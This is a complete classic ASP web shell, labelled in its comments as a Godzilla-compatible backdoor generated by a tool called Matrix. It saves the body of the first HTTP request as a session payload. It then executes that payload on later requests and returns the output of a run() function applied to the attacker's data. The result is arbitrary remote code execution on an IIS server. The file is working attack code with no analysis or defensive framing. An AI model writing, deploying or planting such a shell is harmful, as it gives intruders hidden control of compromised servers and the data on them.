<%'
' Godzilla-compatible classic ASP shell (ASP_RAW), generated by Matrix.
'
' No encryption and no base64: the request body is the raw params blob and the
' response is the raw result. No markers.
Function MxToText(ByVal vData)
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write vData
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "iso-8859-1"
    MxToText = stream.ReadText()
    stream.Close
    Set stream = Nothing
End Function

Dim mxSize, mxData
mxSize = Request.TotalBytes
If mxSize > 0 Then
    mxData = Request.BinaryRead(mxSize)
    If IsEmpty(Session("payload")) Then
        Session("payload") = MxToText(mxData)
    Else
        Execute(Session("payload"))
        Response.BinaryWrite run(mxData)
    End If
End If
%>
